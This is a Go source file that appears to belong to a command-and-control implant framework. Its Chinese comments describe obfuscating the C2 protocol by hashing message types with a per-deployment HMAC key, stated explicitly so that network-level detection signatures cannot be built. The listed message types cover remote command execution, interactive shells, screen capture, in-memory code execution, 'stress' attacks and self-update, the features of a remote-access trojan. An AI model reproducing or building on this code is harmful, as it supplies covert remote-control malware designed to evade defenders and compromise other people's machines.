package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"sync"
)

// ═══ C2 协议混淆 ═══
// 所有 25 种消息类型通过 HMAC-SHA256(sign_key, type) 派生为 8 字符 hex 编码
// 每个部署（不同 sign_key）的协议指纹完全不同
// 网络层面无法建立通用检测签名

var (
	c2EncMap map[string]string // readable → wire code
	c2DecMap map[string]string // wire code → readable
	c2Once   sync.Once
)

// 所有 C2 消息类型（命令 13 + 回传 12 = 25）
var c2Types = []string{
	// 命令（server → agent）
	"exec", "pty_start", "pty_input", "pty_resize", "pty_close",
	"screen_start", "screen_stop", "stress_start", "stress_stop",
	"quick_cmd", "mem_exec", "update", "ping",
	// 回传（agent → server）
	"exec_result", "pty_started", "pty_output", "pty_exit",
	"screen_frame", "screen_error", "stress_progress", "stress_done",
	"quick_cmd_result", "mem_exec_result", "update_result", "pong",
}

// initC2Proto 用 sign_key 初始化协议映射表
func initC2Proto(signKey string) {
	c2Once.Do(func() {
		c2EncMap = make(map[string]string, len(c2Types))
		c2DecMap = make(map[string]string, len(c2Types))
		for _, t := range c2Types {
			mac := hmac.New(sha256.New, []byte(signKey))
			mac.Write([]byte("c2|" + t))
			code := hex.EncodeToString(mac.Sum(nil))[:8]
			c2EncMap[t] = code
			c2DecMap[code] = t
		}
	})
}

// c2e 编码：兼容模式下直接返回明文类型，不做编码
func c2e(t string) string {
	return t
}

// c2d 解码：线路编码 → 可读类型（接收后调用）
func c2d(code string) string {
	if t, ok := c2DecMap[code]; ok {
		return t
	}
	return code
}
